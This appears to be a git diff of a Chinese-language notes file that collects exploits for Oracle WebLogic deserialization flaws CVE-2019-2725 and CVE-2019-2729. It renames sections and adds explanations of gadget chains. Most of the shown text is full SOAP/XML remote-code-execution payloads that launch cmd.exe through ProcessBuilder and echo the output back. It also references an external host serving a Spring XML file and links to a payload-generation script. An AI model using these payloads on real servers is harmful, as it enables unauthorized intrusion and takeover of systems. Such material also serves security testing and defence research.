@@ -9,7 +9,7 @@
 
 限制条件在于：服务器能否外联出网
 
-### CVE-2019-2725_v10_v12
+### CVE-2019-2725_v10_12_spring
 poc:
 ```xml
 <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"><soapenv:Header><wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"> 
@@ -25,7 +25,7 @@ http://cqq.com:8888/spel2.xml
 <soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>
 ```
 
-### CVE-2019-2729_v10
+### CVE-2019-2729_v10_spring
 由于jdk的xmldecoder原因，`<array method="forName">`仅支持基于jdk6的v10.
 
 poc:
@@ -58,7 +58,29 @@ poc:
 </beans>
 ```
 
-### CVE-2019-2725_v12
+
+### CVE-2019-2729_v10_UnitOfWorkChangeSet_jdk7u21
+
+`oracle.toplink.internal.sessions.UnitOfWorkChangeSet`这个类只在v10中。
+原理：
+>`UnitOfWorkChangeSet`类构造方法中直接调用了JDK原生类中的readObject()方法，并且其构造方法的接收参数恰好是字节数组，这就满足了上一个补丁中array标签的class属性值必须为byte的要求，再借助带index属性的void元素，完成向字节数组中赋值恶意序列化对象的过程，最终利用JDK 7u21反序列化漏洞造成了远程代码执行。通过巧妙的利用了void、array和Class这三个元素成功的打造了利用链。
+
+来源：
+- [Weblogic反序列化远程代码执行漏洞（CVE-2019-2725）分析报告](https://mp.weixin.qq.com/s/fPZhWOyPexgQy6f-9c-JSw)
+
+payload生成参考：
+- [
+WebLogic wls9-async组件RCE分析（CVE-2019-2725）](https://lucifaer.com/2019/05/10/WebLogic%20wls9-async%E7%BB%84%E4%BB%B6RCE%E5%88%86%E6%9E%90%EF%BC%88CVE-2019-2725%EF%BC%89/)
+
+
+### CVE-2019-2729_v10_UnitOfWorkChangeSet_with_echo
+
+带回显的payload：
+来源：
+- https://github.com/starnightcyber/VEF/blob/ebbdeed2556d56fd0a59796f72c8643f277a5151/scripts/weblogic-cve-2019-2729.py
+
+
+### CVE-2019-2725_v12_EventData_double_xml
 利用`org.slf4j.ext.EventData`进行二次xml反序列化。`org.slf4j.ext.EventData`只存在于v12中。
 poc（加载自定义类）:
 ```xml
@@ -117,11 +139,13 @@ poc（加载自定义类）:
 <soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>
 ```
 
+
+
+### CVE-2019-2725_v12_EventData_simple
 另外一poc：
-执行
 ```xml
 <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"> <soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo> <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"> 
-<java><class><string>org.slf4j.ext.EventData</string><void><string><![CDATA[<java class="java.beans.XMLDecoder"><void class="java.lang.ProcessBuilder"><array class="java.lang.String" length="3"><void index = "0"><string>cmd.exe</string></void><void index = "1"><string>/c</string></void><void index = "2"><string>calc</string></void></array><void method="start" id="process"/></void><object idref="process"><void id="inputStream" method="getInputStream"/></object><object id="scanner" class="java.util.Scanner"><object idref="inputStream"/></object><object idref="scanner"><void method="useDelimiter"><string>\\A</string></void><void id="result" method="next"/></object><void class="java.lang.Thread" method="currentThread"><void method="getCurrentWork" id="current_work"><void method="getClass"><void method="getDeclaredField"><string>connectionHandler</string><void method="setAccessible"><boolean>true</boolean></void><void method="get"><object idref="current_work"></object><void method="getServletRequest"><void method="getResponse"><void method="getServletOutputStream"><void method="writeStream"><object class="weblogic.xml.util.StringInputStream"><object idref="result"></object></object></void><void method="flush"/></void><void method="getWriter"><void method="write"><string></string></void></void></void></void></void></void></void></void></void></java>]]></string></void></class></java>
+<java><class><string>org.slf4j.ext.EventData</string><void><string><![CDATA[<java class="java.beans.XMLDecoder"><void class="java.lang.ProcessBuilder"><array class="java.lang.String" length="3"><void index = "0"><string>cmd.exe</string></void><void index = "1"><string>/c</string></void><void index = "2"><string></string></void></array><void method="start" id="process"/></void><object idref="process"><void id="inputStream" method="getInputStream"/></object><object id="scanner" class="java.util.Scanner"><object idref="inputStream"/></object><object idref="scanner"><void method="useDelimiter"><string>\\A</string></void><void id="result" method="next"/></object><void class="java.lang.Thread" method="currentThread"><void method="getCurrentWork" id="current_work"><void method="getClass"><void method="getDeclaredField"><string>connectionHandler</string><void method="setAccessible"><boolean>true</boolean></void><void method="get"><object idref="current_work"></object><void method="getServletRequest"><void method="getResponse"><void method="getServletOutputStream"><void method="writeStream"><object class="weblogic.xml.util.StringInputStream"><object idref="result"></object></object></void><void method="flush"/></void><void method="getWriter"><void method="write"><string></string></void></void></void></void></void></void></void></void></void></java>]]></string></void></class></java>
 </work:WorkContext>
 </soapenv:Header>
 <soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>
